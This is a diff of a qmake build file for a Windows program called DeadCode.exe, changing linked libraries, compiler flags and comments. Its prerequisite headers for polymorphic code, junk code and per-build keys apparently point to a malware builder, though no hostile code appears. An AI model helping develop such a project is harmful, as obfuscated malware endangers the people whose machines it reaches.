@@ -40,8 +40,10 @@ LIBS += -LC:/vcpkg/installed/x64-windows-static/lib \
         -lcurl \
         -lbcrypt \
         -lws2_32 \
-        -lshlwapi \
-        -lpsapi
+        -lgdiplus \
+        -liphlpapi \
+        -lpsapi \
+        -lshlwapi
 
 # Флаги компиляции
 QMAKE_CXXFLAGS += -O2 \
@@ -49,6 +51,7 @@ QMAKE_CXXFLAGS += -O2 \
                   -Wall \
                   -Wextra \
                   -Werror=return-type \
+                  -Wno-error \
                   -fexceptions \
                   -DUNICODE \
                   -D_UNICODE \
@@ -62,7 +65,6 @@ QMAKE_LFLAGS += -DYNAMICBASE \
                 -SUBSYSTEM:WINDOWS
 
 # Определения для сборки (добавляем дату сборки и версию из git)
-# Исправляем формат даты, чтобы избежать пробелов
 BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyyMMdd'")
 BUILD_VERSION = $$system(git rev-parse --short HEAD 2> nul || echo unknown)
 DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
@@ -74,7 +76,7 @@ OBJECTS_DIR = $$PWD/../release
 MOC_DIR = $$PWD/../release
 UI_DIR = $$PWD/../release
 
-# Очистка (удаляем только исполняемый файл, оставляем заголовки)
+# Очистка (удаляем только исполняемый файл)
 QMAKE_CLEAN += \
     $$DESTDIR/DeadCode.exe
 
@@ -96,7 +98,6 @@ PRE_TARGETDEPS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h
 
-# Удаляем цель gen_headers, так как генерация выполняется в mainwindow.cpp
 # Создание пустых файлов, если они отсутствуют
 !exists($$PWD/../src/build_key.h) {
     system(powershell -Command "New-Item -Path $$PWD/../src/build_key.h -ItemType File -Force")
